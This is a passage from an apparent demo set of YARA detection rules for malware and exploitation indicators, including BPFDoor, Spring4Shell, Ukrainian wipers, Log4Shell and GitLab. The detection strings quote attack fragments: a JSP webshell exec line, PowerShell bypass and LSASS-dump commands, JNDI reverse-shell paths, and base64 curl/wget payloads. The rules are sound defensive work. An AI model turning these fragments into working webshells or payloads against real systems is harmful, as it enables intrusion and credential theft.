\"https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896\"\n      date = \"2022-05-05 18:26:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d\"\n      hash2 = \"4c5cf8f977fc7c368a8e095700a44be36c8332462c0b1e41bff03238b2bf2a2d\"\n      hash3 = \"599ae527f10ddb4625687748b7d3734ee51673b664f2e5d0346e64f85e185683\"\n      tags = \"APT, DEMO, LINUX, MAL, T1070_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[-] Connect failed.\" ascii fullword\n      $s2 = \"export MYSQL_HISTFILE=\" ascii fullword\n      $s3 = \"udpcmd\" ascii fullword\n      $s4 = \"getshell\" ascii fullword\n      $op1 = { e8 ?? ff ff ff 80 45 ee 01 0f b6 45 ee 3b 45 d4 7c 04 c6 45 ee 00 80 45 ff 01 80 7d ff 00 } \n      $op2 = { 55 48 89 e5 48 83 ec 30 89 7d ec 48 89 75 e0 89 55 dc 83 7d dc 00 75 0? } \n      $op3 = { e8 a? fe ff ff 0f b6 45 f6 48 03 45 e8 0f b6 10 0f b6 45 f7 48 03 45 e8 0f b6 00 8d 04 02 } \n      $op4 = { c6 80 01 01 00 00 00 48 8b 45 c8 0f b6 90 01 01 00 00 48 8b 45 c8 88 90 00 01 00 00 c6 45 ef 00 0f b6 45 ef 88 45 ee } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 80KB and 2 of them or 5 of them\n}\n\nrule EXPL_POC_SpringCore_0day_Indicators_Mar22_1_RID3695 : DEMO EXPLOIT SCRIPT T1033 {\n   meta:\n      description = \"Detects indicators found after SpringCore exploitation attempts and in the POC script\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/vxunderground/status/1509170582469943303\"\n      date = \"2022-03-30 17:02:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, SCRIPT, T1033\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di\" \n      $x2 = \"?pwd=j&cmd=whoami\" \n      $x3 = \".getParameter(%22pwd%22)\" \n      $x4 = \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B\" \n   condition: \n      1 of them\n}\n\nrule EXPL_POC_SpringCore_0day_Webshell_Mar22_1_RID35BB : DEMO EXPLOIT SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects webshell found after SpringCore exploitation attempts POC script\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/vxunderground/status/1509170582469943303\"\n      date = \"2022-03-30 16:25:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".getInputStream(); int a = -1; byte[] b = new byte[2048];\" \n      $x2 = \"if(\\\"j\\\".equals(request.getParameter(\\\"pwd\\\")\" \n      $x3 = \".getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream();\" \n   condition: \n      filesize < 200KB and 1 of them\n}\n\nrule MAL_WIPER_CaddyWiper_Mar22_1_RID308F : DEMO EXE MAL {\n   meta:\n      description = \"Detects CaddyWiper malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ESETresearch/status/1503436420886712321?s=20&t=xh8JK6fEmRIrnqO7Ih_PNg\"\n      date = \"2022-03-15 12:45:01\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1e87e9b5ee7597bdce796490f3ee09211df48ba1d11f6e2f5b255f05cc0ba176\"\n      hash2 = \"a294620543334a721a2ae8eaaf9680a0786f4b9a216d75b55cfd28f39e9430ea\"\n      hash3 = \"ea6a416b320f32261da8dafcf2faf088924f99a3a84f7b43b964637ea87aef72\"\n      tags = \"DEMO, EXE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { ff 55 94 8b 45 fc 50 ff 55 f8 8a 4d ba 88 4d ba 8a 55 ba 80 ea 01 } \n      $op2 = { 89 45 f4 83 7d f4 00 74 04 eb 47 eb 45 6a 00 8d 95 1c ff ff ff 52 } \n      $op3 = { 6a 20 6a 02 8d 4d b0 51 ff 95 68 ff ff ff 85 c0 75 0a e9 4e 02 00 00 } \n      $op4 = { e9 67 01 00 00 83 7d f4 05 74 0a e9 5c 01 00 00 e9 57 01 00 00 8d 45 98 50 6a 20 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 3 of them or all of them\n}\n\nrule MAL_WIPER_IsaacWiper_Mar22_1_RID308B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects IsaacWiper malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/\"\n      date = \"2022-03-03 12:44:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"13037b749aa4b1eda538fda26d6ac41c8f7b1d02d83f47b0d187dd645154e033\"\n      hash2 = \"7bcd4ec18fc4a56db30e0aaebd44e2988f98f7b5d8c14f6689f650b4f11e16c0\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"C:\\\\ProgramData\\\\log.txt\" wide fullword\n      $s2 = \"Cleaner.dll\" ascii fullword\n      $s3 = \"-- system logical drive: \" wide fullword\n      $s4 = \"-- FAILED\" wide fullword\n      $op1 = { 8b f1 80 3d b0 66 03 10 00 0f 85 96 00 00 00 33 c0 40 b9 a8 66 03 10 87 01 33 db } \n      $op2 = { 8b 40 04 2b c2 c1 f8 02 3b c8 74 34 68 a2 c8 01 10 2b c1 6a 04 } \n      $op3 = { 8d 4d f4 ff 75 08 e8 12 ff ff ff 68 88 39 03 10 8d 45 f4 50 e8 2d 1d 00 00 cc } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( pe.imphash ( ) == \"a4b162717c197e11b76a4d9bc58ea25d\" or 3 of them )\n}\n\nrule APT_UA_Hermetic_Wiper_Artefacts_Feb22_1_RID353D : APT DEMO T1021_002 T1105 T1218_011 {\n   meta:\n      description = \"Detects artefacts found in Hermetic Wiper malware related intrusions\"\n      author = \"Florian Roth\"\n      reference = \"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia\"\n      date = \"2022-02-25 16:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, T1021_002, T1105, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sx1 = \"/c powershell -c \\\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump\" ascii wide\n      $sx2 = \"appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log\" ascii wide\n      $sx3 = \"AppData\\\\Local\\\\Microsoft\\\\Windows\\\\Winupd.log\" ascii wide\n      $sx4 = \"CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1\" ascii wide\n      $sx5 = \"\\\\policydefinitions\\\\postgresql.exe\" ascii wide\n      $sx6 = \"powershell -v 2 -exec bypass -File text.ps1\" ascii wide\n      $sx7 = \"powershell -exec bypass gp.ps1\" ascii wide\n      $sx8 = \"powershell -exec bypass -File link.ps1\" ascii wide\n      $sx9 = \" 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__16\" ascii wide\n      $sa1 = \"(New-Object System.Net.WebClient).DownloadFile(\" ascii wide\n      $sa2 = \"CSIDL_SYSTEM_DRIVE\\\\temp\\\\\" ascii wide\n      $sa3 = \"1> \\\\\\\\127.0.0.1\\\\ADMIN$\" ascii wide\n      $fp1 = \"<html\" ascii\n   condition: \n      1 of ( $sx* ) or all of ( $sa* ) and not 1 of ( $fp* )\n}\n\nrule APT_UA_Hermetic_Wiper_Scheduled_Task_Feb22_1_RID3723 : APT DEMO T1021_002 T1053_005 {\n   meta:\n      description = \"Detects scheduled task pattern found in Hermetic Wiper malware related intrusions\"\n      author = \"Florian Roth\"\n      reference = \"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia\"\n      date = \"2022-02-25 17:25:41\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, T1021_002, T1053_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a0 = \"<Task version=\" ascii wide\n      $sa1 = \"CSIDL_SYSTEM_DRIVE\\\\temp\" ascii wide\n      $sa2 = \"postgresql.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\" ascii wide\n      $sa3 = \"cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\" ascii wide\n   condition: \n      $a0 and 1 of ( $s* )\n}\n\nrule MAL_OBFUSC_Unknown_Jan22_1_RID2FC7 : DEMO EXE FILE MAL OBFUS T1027 {\n   meta:\n      description = \"Detects samples similar to reversed stage3 found in Ukrainian wiper incident named WhisperGate\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/juanandres_gs/status/1482827018404257792\"\n      date = \"2022-01-16 12:11:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d\"\n      tags = \"DEMO, EXE, FILE, MAL, OBFUS, T1027\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 37 00 63 00 38 00 63 00 62 00 35 00 35 00 39 00\n               38 00 65 00 37 00 32 00 34 00 64 00 33 00 34 00\n               33 00 38 00 34 00 63 00 63 00 65 00 37 00 34 00\n               30 00 32 00 62 00 31 00 31 00 66 00 30 00 65 } \n      $xc2 = { 4D 61 69 6E 00 43 6C 61 73 73 4C 69 62 72 61 72\n               79 31 00 70 63 31 65 } \n      $s1 = \".dll\" wide\n      $s2 = \"%&%,%s%\" ascii fullword\n      $op1 = { a2 87 fa b1 44 a5 f5 12 da a7 49 11 5c 8c 26 d4 75 } \n      $op2 = { d7 af 52 38 c7 47 95 c8 0e 88 f3 d5 0b } \n      $op3 = { 6c 05 df d6 b8 ac 11 f2 67 16 cb b7 34 4d b6 91 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule MAL_Unknown_Discord_Characteristics_Jan22_1_RID3748 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects unknown malware with a few indicators also found in Wiper malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/\"\n      date = \"2022-01-16 17:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"xownxloxadDxatxxax\" wide\n      $s2 = \"https://cdn.discordapp.com/attachments/\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule APT_HKTL_Wiper_WhisperGate_Jan22_1_RID331C : APT DEMO EXE HKTL {\n   meta:\n      description = \"Detects unknown wiper malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/\"\n      date = \"2022-01-16 14:33:51\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92\"\n      tags = \"APT, DEMO, EXE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 41 41 41 41 41 00 59 6F 75 72 20 68 61 72 64 20\n               64 72 69 76 65 20 68 61 73 20 62 65 65 6E 20 63\n               6F 72 72 75 70 74 65 64 } \n      $op1 = { 89 34 24 e8 3f ff ff ff 50 8d 65 f4 31 c0 59 5e 5f } \n      $op2 = { 8d bd e8 df ff ff e8 04 de ff ff b9 00 08 00 00 f3 a5 c7 44 24 18 00 00 00 00 c7 44 24 14 00 00 00 00 c7 44 24 10 03 00 00 00 c7 44 24 0c 00 00 00 00 } \n      $op3 = { c7 44 24 0c 00 00 00 00 c7 44 24 08 00 02 00 00 89 44 24 04 e8 aa fe ff ff 83 ec 14 89 34 24 e8 3f ff ff ff 50 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 2 of them ) or all of them\n}\n\nrule APT_HKTL_Wiper_WhisperGate_Jan22_2_RID331D : APT DEMO EXE HKTL {\n   meta:\n      description = \"Detects unknown wiper malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/\"\n      date = \"2022-01-16 14:34:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78\"\n      tags = \"APT, DEMO, EXE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sc1 = { 70 00 6F 00 77 00 65 00 72 00 73 00 68 00 65 00\n               6C 00 6C 00 00 27 2D 00 65 00 6E 00 63 00 20 00\n               55 00 77 00 42 00 30 00 41 00 47 00 45 00 41 00\n               63 00 67 00 42 00 30 00 41 00 43 } \n      $sc2 = { 59 00 6C 00 66 00 77 00 64 00 77 00 67 00 6D 00\n               70 00 69 00 6C 00 7A 00 79 00 61 00 70 00 68 } \n      $s1 = \"xownxloxadDxatxxax\" wide\n      $s2 = \"0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==\" wide\n      $s3 = \"https://cdn.discordapp.com/attachments/\" wide\n      $s4 = \"fffxfff.fff\" ascii fullword\n      $op1 = { 20 6b 85 b9 03 20 14 19 91 52 61 65 20 e1 ae f1 } \n      $op2 = { aa ae 74 20 d9 7c 71 04 59 20 71 cc 13 91 61 20 97 3c 2a c0 } \n      $op3 = { 38 9c f3 ff ff 20 f2 96 4d e9 20 5d ae d9 ce 58 20 4f 45 27 } \n      $op4 = { d4 67 d4 61 80 1c 00 00 04 38 35 02 00 00 20 27 c0 db 56 65 20 3d eb 24 de 61 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 5 of them or 7 of them\n}\n\nrule APT_MAL_HP_iLO_Firmware_Dec21_1_RID3183 : APT DEMO LINUX MAL {\n   meta:\n      description = \"Detects suspicios ELF files with sections as described in malicious iLO Board analysis by AmnPardaz in December 2021\"\n      author = \"Florian Roth\"\n      reference = \"https://threats.amnpardaz.com/en/2021/12/28/implant-arm-ilobleed-a/\"\n      date = \"2021-12-28 13:25:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".newelf.elf.text\" ascii\n      $s2 = \".newelf.elf.libc.so.data\" ascii\n      $s3 = \".newelf.elf.Initial.stack\" ascii\n      $s4 = \".newelf.elf.libevlog.so.data\" ascii\n   condition: \n      filesize < 5MB and 2 of them or all of them\n}\n\nrule EXPL_Log4j_CallBackDomain_IOCs_Dec21_1_RID3418 : CVE_2021_44228 DEMO EXPLOIT FILE {\n   meta:\n      description = \"Detects IOCs found in Log4Shell incidents that indicate exploitation attempts of CVE-2021-44228\"\n      author = \"Florian Roth\"\n      reference = \"https://gist.github.com/superducktoes/9b742f7b44c71b4a0d19790228ce85d8\"\n      date = \"2021-12-12 15:15:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_44228, DEMO, EXPLOIT, FILE\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $xr1 = /\\b(ldap|rmi):\\/\\/([a-z0-9\\.]{1,16}\\.bingsearchlib\\.com|[a-z0-9\\.]{1,40}\\.interact\\.sh|[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):[0-9]{2,5}\\/([aZ]|ua|Exploit|callback|[0-9]{10}|http443useragent|http80useragent)\\b/ \n   condition: \n      1 of them\n}\n\nrule EXPL_JNDI_Exploit_Patterns_Dec21_1_RID3320 : DEMO EXPLOIT {\n   meta:\n      description = \"Detects JNDI Exploit Kit patterns in files\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/pimps/JNDI-Exploit-Kit\"\n      date = \"2021-12-12 14:34:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x01 = \"/Basic/Command/Base64/\" \n      $x02 = \"/Basic/ReverseShell/\" \n      $x03 = \"/Basic/TomcatMemshell\" \n      $x04 = \"/Basic/JettyMemshell\" \n      $x05 = \"/Basic/WeblogicMemshell\" \n      $x06 = \"/Basic/JBossMemshell\" \n      $x07 = \"/Basic/WebsphereMemshell\" \n      $x08 = \"/Basic/SpringMemshell\" \n      $x09 = \"/Deserialization/URLDNS/\" \n      $x10 = \"/Deserialization/CommonsCollections1/Dnslog/\" \n      $x11 = \"/Deserialization/CommonsCollections2/Command/Base64/\" \n      $x12 = \"/Deserialization/CommonsBeanutils1/ReverseShell/\" \n      $x13 = \"/Deserialization/Jre8u20/TomcatMemshell\" \n      $x14 = \"/TomcatBypass/Dnslog/\" \n      $x15 = \"/TomcatBypass/Command/\" \n      $x16 = \"/TomcatBypass/ReverseShell/\" \n      $x17 = \"/TomcatBypass/TomcatMemshell\" \n      $x18 = \"/TomcatBypass/SpringMemshell\" \n      $x19 = \"/GroovyBypass/Command/\" \n      $x20 = \"/WebsphereBypass/Upload/\" \n      $fp1 = \"<html\" \n   condition: \n      1 of ( $x* ) and not 1 of ( $fp* )\n}\n\nrule EXPL_Log4j_CVE_2021_44228_JAVA_Exception_Dec21_1_RID361A : CVE_2021_44228 DEMO EXPLOIT {\n   meta:\n      description = \"Detects exceptions found in server logs that indicate an exploitation attempt of CVE-2021-44228\"\n      author = \"Florian Roth\"\n      reference = \"https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b\"\n      date = \"2021-12-12 16:41:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_44228, DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xa1 = \"header with value of BadAttributeValueException: \" \n      $sa1 = \".log4j.core.net.JndiManager.lookup(JndiManager\" \n      $sa2 = \"Error looking up JNDI resource\" \n   condition: \n      $xa1 or all of ( $sa* )\n}\n\nrule EXPL_Log4j_CVE_2021_44228_Dec21_Hard_RID31D9 : CVE_2021_44228 DEMO EXPLOIT FILE {\n   meta:\n      description = \"Detects indicators in server logs that indicate the exploitation of CVE-2021-44228\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/h113sdx/status/1469010902183661568?s=20\"\n      date = \"2021-12-10 13:40:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-20\"\n      tags = \"CVE_2021_44228, DEMO, EXPLOIT, FILE\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $x1 = /\\$\\{jndi:(ldap|ldaps|rmi|dns|iiop|http|nis|nds|corba):\\/[\\/]?[a-z-\\.0-9]{3,120}:[0-9]{2,5}\\/[a-zA-Z\\.]{1,32}\\}/ \n      $x2 = \"Reference Class Name: foo\" \n      $fp1r = /(ldap|rmi|ldaps|dns):\\/[\\/]?(127\\.0\\.0\\.1|192\\.168\\.|172\\.[1-3][0-9]\\.|10\\.)/ \n      $fpg2 = \"<html\" \n      $fpg3 = \"<HTML\" \n      $fp1 = \"/QUALYSTEST\" ascii\n      $fp2 = \"w.nessus.org/nessus\" \n      $fp3 = \"/nessus}\" \n   condition: \n      1 of ( $x* ) and not 1 of ( $fp* )\n}\n\nrule SUSP_Base64_Encoded_Exploit_Indicators_Dec21_RID3732 : CVE_2021_44228 DEMO EXPLOIT FILE SUSP T1132_001 {\n   meta:\n      description = \"Detects base64 encoded strings found in payloads of exploits against log4j CVE-2021-44228\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/Reelix/status/1469327487243071493\"\n      date = \"2021-12-10 17:28:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-12-13\"\n      tags = \"CVE_2021_44228, DEMO, EXPLOIT, FILE, SUSP, T1132_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"Y3VybCAtcy\" \n      $sa2 = \"N1cmwgLXMg\" \n      $sa3 = \"jdXJsIC1zI\" \n      $sb1 = \"fHdnZXQgLXEgLU8tI\" \n      $sb2 = \"x3Z2V0IC1xIC1PLS\" \n      $sb3 = \"8d2dldCAtcSAtTy0g\" \n      $fp1 = \"<html\" \n   condition: \n      1 of ( $sa* ) and 1 of ( $sb* ) and not 1 of ( $fp* )\n}\n\nrule SUSP_JDNIExploit_Indicators_Dec21_RID3302 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects indicators of JDNI usage in log files and other payloads\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/flypig5211/JNDIExploit\"\n      date = \"2021-12-10 14:29:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-12-12\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $xr1 = /(ldap|ldaps|rmi|dns|iiop|http|nis|nds|corba):\\/\\/[a-zA-Z0-9\\.]{7,80}:[0-9]{2,5}\\/(Basic\\/Command\\/Base64|Basic\\/ReverseShell|Basic\\/TomcatMemshell|Basic\\/JBossMemshell|Basic\\/WebsphereMemshell|Basic\\/SpringMemshell|Basic\\/Command|Deserialization\\/CommonsCollectionsK|Deserialization\\/CommonsBeanutils|Deserialization\\/Jre8u20\\/TomcatMemshell|Deserialization\\/CVE_2020_2555\\/WeblogicMemshell|TomcatBypass|GroovyBypass|WebsphereBypass)\\// \n   condition: \n      filesize < 100MB and $xr1\n}\n\nrule EXPL_Zoho_RCE_Fix_Lines_Dec21_1_RID31C0 : DEMO EXPLOIT {\n   meta:\n      description = \"Detects lines in log lines of Zoho products that indicate RCE fixes (silent removal of evidence)\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1467784104930385923\"\n      date = \"2021-12-06 13:35:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"RCEF=\" \n      $sa1 = \"\\\"attackStatus\\\"\\\\:\\\"active\\\"\" \n      $sa2 = \"\\\"attackStatus\\\":\\\"active\\\"\" \n      $sd1 = \"deletedCount\" \n      $sd_fp1 = \"\\\"deletedCount\\\"\\\\:0\" \n      $sd_fp2 = \"\\\"deletedCount\\\":0\" \n   condition: \n      filesize < 6MB and $s1 and ( 1 of ( $sa* ) or ( $sd1 and not 1 of ( $sd_fp* ) ) )\n}\n\nrule EXPL_GitLab_CE_RCE_CVE_2021_22205_RID30B7 : CVE_2021_22205 DEMO EXPLOIT {\n   meta:\n      description = \"Detects signs of exploitation of GitLab CE CVE-2021-22205\"\n      author = \"Florian Roth\"\n      reference = \"https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/\"\n      date = \"2021-10-26 12:51:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_22205, DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"VXNlci5maW5kX2J5KHVzZXJuYW1l\" ascii\n      $sa2 = \"VzZXIuZmluZF9ieSh1c2VybmFtZ\" ascii\n      $sa3 = \"Vc2VyLmZpbmRfYnkodXNlcm5hbW\" ascii\n      $sb1 = \"dXNlci5hZG1pb\" ascii\n      $sb2 = \"VzZXIuYWRtaW\" ascii\n      $sb3 = \"1c2VyLmFkbWlu\" ascii\n      $sc1 = \"dXNlci5zYXZlI\" ascii\n      $sc2 = \"VzZXIuc2F2ZS\" ascii\n      $sc3 = \"1c2VyLnNhdmUh\" ascii\n   condition: \n      1 of ( $sa* ) and 1 of ( $sb* ) and 1 of ( $sc* )\n}\n\nrule EXPL_GitLab_CE_RCE_Malformed_JPG_CVE_2021_22204_RID35EC : CVE_2021_22204 CVE_2021_22205 DEMO EXPLOIT {\n   meta:\n      description = \"Detects malformed JPG files exploting EXIF vulnerability CVE-2021-22204 and used in the exploitation of GitLab vulnerability CVE-2021-22205\"\n      author = \"Florian Roth\"\n      reference = \"https://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis?referrer=blog\"\n      date = \"2021-10-26 16:33:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_22204, CVE_2021_22205, DEMO, EXPLOIT\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $h1 = { 41 54 26 54 46 4F 52 4D } \n      $sr1 = /\\(metadata[\\s]{0,3}\\([A-Za-z]{1,20} \"\\\\/ \n   condition: \n      filesize < 10KB and $h1 and $sr1\n}\n\nrule SUSP_PE_Discord_Attachment_Oct21_1_RID3357 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious executable with reference to a Discord attachment (often used for malware hosting on a legitimate FQDN)\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2021-10-12 14:43:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"https://cdn.discordapp.com/attachments/\" ascii wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 1 of them\n}\n\nrule SUSP_Encoded_Discord_Attachment_Oct21_1_RID3574 : DEMO SUSP T1027 {\n   meta:\n      description = \"Detects suspicious encoded URL to a Discord attachment (often used for malware hosting on a legitimate FQDN)\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2021-10-12 16:13:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP, T1027\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $enc_b01 = \"Y2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRz\" ascii wide\n      $enc_b02 = \"Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50c\" ascii wide\n      $enc_b03 = \"jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudH\" ascii wide\n      $enc_b04 = \"AGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABz\" ascii wide\n      $enc_b05 = \"BjAGQAbgAuAGQAaQBzAGMAbwByAGQAYQBwAHAALgBjAG8AbQAvAGEAdAB0AGEAYwBoAG0AZQBuAHQAc\" ascii wide\n      $enc_b06 = \"AYwBkAG4ALgBkAGkAcwBjAG8AcgBkAGEAcABwAC4AYwBvAG0ALwBhAHQAdABhAGMAaABtAGUAbgB0AH\" ascii wide\n      $enc_h01 = \"63646E2E646973636F72646170702E636F6D2F6174746163686D656E7473\" ascii wide\n      $enc_h02 = \"63646e2e646973636f72646170702e636f6d2f6174746163686d656e7473\" ascii wide\n      $enc_r01 = \"stnemhcatta/moc.ppadrocsid.ndc\" ascii wide\n   condition: \n      filesize < 5000KB and 1 of them\n}\n\nrule LOG_EXPL_ADSelfService_CVE_2021_40539_WebLog_Sep21_1_RID37A8 : CVE_2021_40539 DEMO EXPLOIT LOG {\n   meta:\n      description = \"Detects suspicious log lines produeced during the exploitation of ADSelfService vulnerability CVE-2021-40539\"\n      author = \"Florian Roth\"\n      reference = \"https://us-cert.cisa.gov/ncas/alerts/aa21-259a\"\n      date = \"2021-09-20 17:47:51\"\n      score = 65\n   